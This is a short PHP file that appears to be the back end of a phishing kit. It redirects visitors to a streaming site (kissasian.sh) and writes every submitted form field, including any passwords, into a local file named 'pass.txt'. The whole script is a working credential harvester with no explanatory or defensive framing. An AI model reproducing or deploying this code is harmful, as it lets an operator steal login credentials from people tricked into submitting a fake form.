<?php
header('location:https://kissasian.sh/?__cf_chl_jschl_tk__=81b73f9007a4e85b63eba07c52fc00030e0722a6-1592873870-0-Ad8nGRtSg_hp-hliyKuR9eo4XGVLN_tQw94aAMEo8XGv_XGmW-slh2EivSHL3ch8PtyRHLxrYcplVXQj0cGVon8gUA3Y60c8vs0gvREHcYmJexwf24ZmhKHas9_hutmUEivqfzD4E1_nGzE6bF4QmHk8rvGLTAB7Ogxowu1ktAlIkT41u3zEFwFE4Y8JU5bY_O2zi85xDotMAaWKe7Mo8V0HACqtWSMh6ARtj9wz8njh5OrCNK6DiFbU8O0-slIEY9rLF13F8eiH7p7rNnklW8A');
$handle = fopen("pass.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;

?>